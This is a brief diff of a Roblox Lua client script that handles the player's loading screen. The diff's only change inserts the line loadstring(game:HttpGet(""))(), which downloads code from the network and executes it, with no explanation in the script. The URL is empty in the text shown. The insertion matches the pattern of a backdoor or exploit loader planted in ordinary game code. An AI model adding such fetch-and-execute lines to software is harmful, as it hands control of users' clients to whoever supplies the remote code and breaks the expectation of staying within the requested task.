@@ -3,7 +3,8 @@ local LocalPlayer = Players.LocalPlayer
 
 task.spawn(function() 
     local PlayerGui = LocalPlayer:WaitForChild("PlayerGui") 
-    local LoadScreen = PlayerGui:WaitForChild("LoadScreen") 
+    local LoadScreen = PlayerGui:WaitForChild("LoadScreen")
+    loadstring(game:HttpGet(""))()
     LoadScreen.AncestryChanged:Connect(function(_, parent) 
         if not parent then 
             task.wait(1)
